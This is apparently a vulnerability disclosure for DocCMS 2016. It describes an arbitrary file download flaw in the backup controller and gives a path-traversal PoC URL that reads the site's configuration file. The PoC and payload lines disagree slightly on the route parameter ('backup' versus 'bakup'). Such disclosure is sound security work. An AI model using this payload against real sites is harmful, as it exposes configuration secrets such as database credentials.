# Summary
DocCMS2016 (http://doccms.com/?p=40) has an arbitrary file download vulnerability at `\admini\controller\system\bakup.php`.

# Analyze
You can get the source code of the website here: https://gitee.com/husky/DocCMS/releases/download/2016/DocCms-20160517.rar

In `\admini\controller\system\bakup.php`:
In function `file_down`, No filtering is done on the `$file` variable passed in:
![image](https://github.com/user-attachments/assets/197d26f0-7563-4c73-91d7-db83c0cba074)

In function `download`, There is also no filtering of the `$filename` variable passed in.:
![image](https://github.com/user-attachments/assets/aa168440-5a78-4033-8d21-54f2d5a5e6b0)

According to the routing format defined by the website, we can construct the following PoC:
```
/admini/index.php?m=system&s=backup&a=download&filename=../../config/doc-config-cn.php
```
This will be able to read the website's configuration file.

# Details
Payload:
```
http://127.0.0.1/admini/index.php?m=system&s=bakup&a=download&filename=../../config/doc-config-cn.php
```

(From `https://www.cnblogs.com/xiaozi/p/8723430.html`)
![image](https://github.com/user-attachments/assets/32b09092-1634-4b20-b558-8e02f11604b7)


# PoC
```
/admini/index.php?m=system&s=backup&a=download&filename=../../config/doc-config-cn.php
```
(From `https://www.cnblogs.com/xiaozi/p/8723430.html`)
![image](https://github.com/user-attachments/assets/32b09092-1634-4b20-b558-8e02f11604b7)
